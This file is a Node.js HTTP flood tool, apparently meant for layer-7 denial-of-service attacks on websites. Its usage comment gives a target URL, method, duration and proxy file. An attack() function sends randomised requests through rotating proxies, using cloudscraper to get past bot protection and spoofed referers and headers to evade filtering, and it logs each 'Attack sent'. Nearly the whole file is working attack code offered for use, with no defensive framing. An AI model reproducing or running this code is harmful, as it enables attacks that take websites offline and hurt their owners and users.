/*
	npm i cloudscraper request --save
	node . https://example.com GET 60 proxies.txt
*/
...
// Referer
let referer = [
	'https://www.google.com/search?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://search.privacytools.io/search?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://www.bing.com/search?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://searx.me/search?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://duckduckgo.com/?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://yandex.com/search/?text=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://www.startpage.com/do/search?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://www.yippy.com/search?query=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://archive.org/search.php?query=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://search.yahoo.com/search?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://www.baidu.com/s?wd=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://www.ask.com/web?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://bypasscors.herokuapp.com/api/?url=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://check-host.net/check-http?host=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://api.hackertarget.com/httpheaders/?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://api.hackertarget.com/pagelinks/?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://www.qwant.com/?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://mxtoolbox.com/domain/' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://store.steampowered.com/search/?term=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://edition.cnn.com/search/?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://en.wikipedia.org/wiki/Special:Search?search=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://archive-it.org/explore?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://search.aol.com/aol/search;?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://twitter.com/search?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://ahmia.fi/search/?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://gibiru.com/results.html?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://image.thum.io/get/' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
	'https://github.com/search?q=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10)
];

let default_user_agent = random_user_agent();
let proxy = 0;
let cookies = {};
...
function attack() {
	...
	let ourproxy = proxies[proxy];

	cloudscraper({
		method: process.argv[3],
		url: process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
		/*agentOptions: {
			secureOptions: cpto.SSL_OP_NO_TLSv1 | cpto.SSL_OP_NO_TLSv1_1,
			ciphers: cpto.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
		},*/
		...
		headers: {
			...
			Accept: random_accept_content(),
			'Accept-Encoding': random_accept_encoding(),
			'Accept-Charset': random_accept_charset(),
			'Accept-Language': random_accept_language(),
			Cookie: cookies[ourproxy] || '',
			Connection: 'Keep-Alive',
			'Access-Control-Allow-Origin': + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
			Origin: process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10),
			Referer: random_referer(),
			Pragma: 'no-cache',
			'Cache-Control': 'no-cache; max-age=0',
			Refresh: '0; url=' + process.argv[2] + '?' + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10)
		},
		proxy: 'http://' + ourproxy
	}, function(error, response, body) {
		cookies[ourproxy] = response.request.headers['cookie'];
		console.log('Attack sent from: ' + ourproxy + ' | Status code: ' + response.statusCode);
	});
}

// Stop the attack after the completed time
setTimeout(() => {
	console.log('Attack has been finished.');
    process.exit(1);
}, process.argv[4] * 1000);
...
// Choose random accepted content
function random_accept_content() {
	return accept_content[Math.floor(Math.random() * accept_content.length)];
}

// Choose random accepted encoding
function random_accept_encoding() {
	return accept_encoding[Math.floor(Math.random() * accept_encoding.length)];
}

// Choose random accepted charset
function random_accept_charset() {
	return accept_charset[Math.floor(Math.random() * accept_charset.length)];
}

// Choose random accepted language
function random_accept_language() {
	return accept_language[Math.floor(Math.random() * accept_language.length)];
}
